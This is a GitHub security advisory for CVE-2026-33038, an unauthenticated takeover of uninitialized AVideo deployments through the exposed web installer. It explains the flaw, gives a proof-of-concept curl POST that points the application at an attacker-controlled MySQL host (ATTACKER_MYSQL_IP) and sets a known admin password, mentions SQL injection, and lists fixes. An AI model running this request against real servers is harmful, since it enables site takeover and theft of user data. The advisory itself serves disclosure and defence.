# [H] AVideo affected by unauthenticated application takeover via exposed web installer on uninitialized deployments

## Summary
Severity: High
Advisory: GHSA-2f9h-23f7-8gcx
CVE: CVE-2026-33038
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-2f9h-23f7-8gcx
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary
The `install/checkConfiguration.php` endpoint performs full application initialization — database setup, admin account creation, and configuration file write — from unauthenticated POST input. The only guard is checking whether `videos/configuration.php` already exists. On uninitialized deployments, any remote attacker can complete the installation with attacker-controlled credentials and an attacker-controlled database, gaining full administrative access.

## Affected Component
- `install/checkConfiguration.php` — entire file (lines 1-273)

## Description

### No authentication or access restriction on installer endpoint

The `checkConfiguration.php` file performs the most privileged operations in the application — creating the database schema, the admin account, and the configuration file — with no authentication, no setup token, no CSRF protection, and no IP restriction. The sole guard is a file-existence check:

```php
// install/checkConfiguration.php — lines 2-5
if (file_exists("../videos/configuration.php")) {
    error_log("Can not create configuration again: ".  json_encode($_SERVER));
    exit;
}
```

If `videos/configuration.php` does not exist (fresh deployment, container restart without persistent storage, re-deployment), the entire installer runs with attacker-controlled POST parameters.

### Attacker-controlled database host eliminates credential guessing

Unlike typical installer exposure vulnerabilities where the attacker must guess the target's database credentials, this endpoint allows the attacker to supply their own database host:

```php
// install/checkConfiguration.php — line 25
$mysqli = @new mysqli($_POST['databaseHost'], $_POST['databaseUser'], $_POST['databasePass'], "", $_POST['databasePort']);
```

The attacker can:
1. Run their own MySQL server with the AVideo schema pre-loaded
2. Set `databaseHost` to their server's IP
3. The connection succeeds (attacker controls the DB)
4. The configuration file is written pointing the application at the attacker's database permanently

### Admin account creation with unsanitized input

The admin user is created with direct POST parameter concatenation into SQL:

```php
// install/checkConfiguration.php — line 120
$sql = "INSERT INTO users (id, user, email, password, created, modified, isAdmin) VALUES (1, 'admin', '"
     . $_POST['contactEmail'] . "', '" . md5($_POST['systemAdminPass']) . "', now(), now(), true)";
```

This has two issues: (1) the attacker controls the admin password, and (2) `$_POST['contactEmail']` is directly concatenated into SQL without escaping (SQL injection).

### Configuration file written with attacker-controlled values

The configuration file is written to disk with all attacker-supplied values embedded:

```php
// install/checkConfiguration.php — lines 238-247
$videosDir = $_POST['systemRootPath'].'videos/';

if(!is_dir($videosDir)){
    mkdir($videosDir, 0777, true);
}

$fp = fopen("{$videosDir}configuration.php", "wb");
fwrite($fp, $content);
fclose($fp);
```

The `$content` variable (built at lines 188-236) embeds `$_POST['databaseHost']`, `$_POST['databaseUser']`, `$_POST['databasePass']`, `$_POST['webSiteRootURL']`, `$_POST['systemRootPath']`, and `$_POST['salt']` directly into the PHP configuration file.

### Inconsistent defense: CLI installer is protected, web endpoint is not

The CLI installer (`install/install.php`) properly restricts access:

```php
// install/install.php — lines 3-5
if (!isCommandLineInterface()) {
    die('Command Line only');
}
```

The web endpoint (`checkConfiguration.php`) lacks any equivalent protection, creating an inconsistent defense pattern.

### No web server protection on install directory

There is no `.htaccess` file in the `install/` directory. The root `.htaccess` does not block access to `install/`. The endpoint is directly accessible at `/install/checkConfiguration.php`.

### Execution chain

1. Attacker discovers an AVideo instance where `videos/configuration.php` does not exist (fresh or re-deployed)
2. Attacker sends POST to `/install/checkConfiguration.php` with their own database host, admin password, and site configuration
3. The script connects to the attacker's database (or the target's with guessed/default credentials)
4. Tables are created, admin user is inserted with attacker's password
5. `configuration.php` is written to disk, permanently configuring the application
6. Attacker logs in as admin with full control over the application

## Proof of Concept

**Step 1:** Set up an attacker-controlled MySQL server with the AVideo schema:

```bash
# On attacker's server
mysql -e "CREATE DATABASE avideo;"
mysql avideo < database.sql  # Use AVideo's own schema file
```

**Step 2:** Send the installation request to the target:

```bash
curl -s -X POST https://TARGET/install/checkConfiguration.php \
  -d 'systemRootPath=/var/www/html/AVideo/' \
  -d 'databaseHost=ATTACKER_MYSQL_IP' \
  -d 'databasePort=3306' \
  -d 'databaseUser=attacker' \
  -d 'databasePass=attacker_pass' \
  -d 'databaseName=avideo' \
  -d 'createTables=1' \
  -d 'contactEmail=attacker@example.com' \
  -d 'systemAdminPass=AttackerPass123!' \
  -d 'webSiteTitle=Pwned' \
  -d 'mainLanguage=en_US' \
  -d 'webSiteRootURL=https://TARGET/'
```

**Step 3:** Log in as admin:

```
Username: admin
Password: AttackerPass123!
```

The attacker now has full administrative access. If using their own database, they control all application data.

## Impact

- **Full application takeover:** Attacker becomes the sole admin with complete control
- **Persistent backdoor via configuration:** The `videos/configuration.php` file is written with attacker-controlled database credentials, ensuring persistent access even after the attack
- **Data exfiltration:** If pointing to the attacker's database, all future user data (registrations, uploads, comments) flows to the attacker
- **Remote code execution potential:** Admin access in AVideo enables file uploads and plugin management, which can lead to arbitrary PHP execution
- **SQL injection bonus:** `$_POST['contactEmail']` on line 120 is directly concatenated into SQL, allowing additional database manipulation

## Recommended Remediation

### Option 1: Add a one-time setup token (preferred)

Generate a random setup token during deployment that must be provided to complete installation:

```php
// At the top of install/checkConfiguration.php, after the file_exists check:

// Require a setup token that was generated during deployment
$setupTokenFile = __DIR__ . '/../videos/.setup_token';
if (!file_exists($setupTokenFile)) {
    $obj = new stdClass();
    $obj->error = "Setup token file not found. Create videos/.setup_token with a random secret.";
    header('Content-Type: application/json');
    echo json_encode($obj);
    exit;
}

$expectedToken = trim(file_get_contents($setupTokenFile));
if (empty($_POST['setupToken']) || !hash_equals($expectedToken, $_POST['setupToken'])) {
    $obj = new stdClass();
    $obj->error = "Invalid setup token.";
    header('Content-Type: application/json');
    echo json_encode($obj);
    exit;
}
```

### Option 2: Restrict installer to localhost/CLI only

Block web access to the installer entirely:

```php
// At the top of install/checkConfiguration.php, after the file_exists check:
if (!isCommandLineInterface()) {
    $allowedIPs = ['127.0.0.1', '::1'];
    if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIPs)) {
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Installation is only allowed from localhost']);
        exit;
    }
}
```

Additionally, add an `.htaccess` file in the `install/` directory:

```apache
# install/.htaccess
<Files "checkConfiguration.php">
    Require local
</Files>
```

### Additional fixes needed

1. **Parameterize SQL queries** on line 120 to prevent SQL injection:
```php
$stmt = $mysqli->prepare("INSERT INTO users (id, user, email, password, created, modified, isAdmin) VALUES (1, 'admin', ?, ?, now(), now(), true)");
$hashedPass = md5($_POST['systemAdminPass']); // Also: upgrade from md5 to password_hash()
$stmt->bind_param("ss", $_POST['contactEmail'], $hashedPass);
$stmt->execute();
```

2. **Upgrade password hashing** from `md5()` to `password_hash()` with `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID`.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-2f9h-23f7-8gcx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33038
- https://github.com/WWBN/AVideo/commit/b3fa7869dcb935c8ab5c001a88dc29d2f92cf8e1
- https://github.com/WWBN/AVideo
